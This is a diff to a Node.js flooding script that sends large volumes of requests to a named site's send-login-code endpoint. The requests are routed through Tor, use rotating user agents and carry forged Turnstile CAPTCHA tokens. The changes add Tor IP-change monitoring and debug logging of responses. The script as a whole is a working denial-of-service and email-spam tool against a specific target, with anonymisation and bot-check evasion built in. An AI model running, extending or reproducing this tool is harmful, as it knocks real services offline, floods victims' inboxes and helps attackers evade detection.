@@ -5,8 +5,8 @@ const fs = require("fs");
 const { SocksProxyAgent } = require("socks-proxy-agent");
 
 if (process.argv.length < 5) {
-    console.log("Usage: node ultra-freeze-rawmix.js <duration_seconds> <rps> <connections> [workers]");
-    console.log("Example: node ultra-freeze-rawmix.js 300 800 200");
+    console.log("Usage: node raymix.js <duration_seconds> <rps> <connections> [workers]");
+    console.log("Example: node raymix.js 300 800 200");
     process.exit(0);
 }
 
@@ -15,12 +15,13 @@ const RPS = parseInt(process.argv[3]);
 const CONNECTIONS = parseInt(process.argv[4]);
 const WORKERS = parseInt(process.argv[5] || os.cpus().length);
 
+const DEBUG = true; // ← Set to false to reduce logging
+
 const TOR_PROXY = "socks5://127.0.0.1:9050";
 const agent = new SocksProxyAgent(TOR_PROXY);
 
 let userAgents = [];
 function generateMockTurnstileToken() {
-    // Helper to generate a random Base64URL-safe string
     const randStr = (len) => {
         const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
         let result = '';
@@ -29,17 +30,12 @@ function generateMockTurnstileToken() {
         }
         return result;
     };
-
-    // Part 1 always starts with "0." followed by a long payload
-    const part1 = '0.' + randStr(250); 
-    // Part 2 is an internal identifier
-    const part2 = randStr(22);         
-    // Part 3 is the signature/hash component
-    const part3 = randStr(64);         
-
-    // Combine them with period separators
+    const part1 = '0.' + randStr(250);
+    const part2 = randStr(22);
+    const part3 = randStr(64);
     return `${part1}.${part2}.${part3}`;
 }
+
 try {
     userAgents = fs.readFileSync("user-agents.txt", "utf8")
                    .split("\n")
@@ -59,9 +55,22 @@ function getRandomUserAgent() {
     return userAgents[Math.floor(Math.random() * userAgents.length)];
 }
 
+// ====================== Tor IP Debug Helper ======================
+async function getCurrentTorIP() {
+    try {
+        const res = await axios.get("https://api.ipify.org?format=json", {
+            httpsAgent: agent,
+            timeout: 5000
+        });
+        return res.data.ip;
+    } catch (e) {
+        return "UNKNOWN";
+    }
+}
+
 // ====================== MASTER ======================
 if (cluster.isPrimary) {
-    console.log("\n=== RAW-MIX STYLE ULTRA FREEZE SPAM ===");
+    console.log("\n=== RAW-MIX STYLE ULTRA FREEZE SPAM (DEBUG ENABLED) ===");
     console.log(`Target     : /api/auth/send-login-code`);
     console.log(`Duration   : ${DURATION} seconds`);
     console.log(`RPS        : ${RPS}`);
@@ -102,6 +111,21 @@ if (cluster.isPrimary) {
     let okCount = 0;
     let errCount = 0;
 
+    // Initial Tor IP
+    let lastTorIP = await getCurrentTorIP();
+    console.log(`[Worker ${process.pid}] 🚀 Initial Tor IP: ${lastTorIP}`);
+
+    // Periodic Tor IP check
+    const ipCheckInterval = setInterval(async () => {
+        const currentIP = await getCurrentTorIP();
+        if (currentIP && currentIP !== lastTorIP) {
+            console.log(`[Worker ${process.pid}] 🔥 Tor IP CHANGED to: ${currentIP}`);
+            lastTorIP = currentIP;
+        } else if (DEBUG) {
+            console.log(`[Worker ${process.pid}] Tor IP: ${currentIP}`);
+        }
+    }, 12000);
+
     const INTERVAL = 100;
     const PER_TICK = Math.ceil(RPS / (1000 / INTERVAL));
 
@@ -117,7 +141,8 @@ if (cluster.isPrimary) {
 
             batch.push(
                 axios.post("https://api.aryankaushik.space/api/auth/send-login-code", 
-                {email: email, 
+                {
+                    email: email,
                     turnstileToken: turnstyletoken
                 }, {
                     httpsAgent: agent,
@@ -129,8 +154,24 @@ if (cluster.isPrimary) {
                         "Referer": "https://aeroweb.aryankaushik.space/"
                     }
                 })
-                .then(() => { okCount++; reqCount++; })
-                .catch(() => { errCount++; reqCount++; })
+                .then((response) => {
+                    okCount++;
+                    reqCount++;
+                    if (DEBUG && Math.random() < 0.05) { // sample ~5% of successes
+                        console.log(`[Worker ${process.pid}] ✅ [${response.status}] Success | ${JSON.stringify(response.data).slice(0, 150)}`);
+                    }
+                })
+                .catch((error) => {
+                    errCount++;
+                    reqCount++;
+                    if (DEBUG) {
+                        const status = error.response ? error.response.status : "TIMEOUT/NO_RESPONSE";
+                        const body = error.response && error.response.data 
+                            ? JSON.stringify(error.response.data).slice(0, 300) 
+                            : error.message;
+                        console.log(`[Worker ${process.pid}] ❌ [${status}] Error | ${body}`);
+                    }
+                })
             );
         }
 
@@ -138,6 +179,7 @@ if (cluster.isPrimary) {
         await new Promise(r => setTimeout(r, INTERVAL));
     }
 
+    clearInterval(ipCheckInterval);
     process.send({ req: reqCount, ok: okCount, err: errCount });
     process.exit(0);
 })();
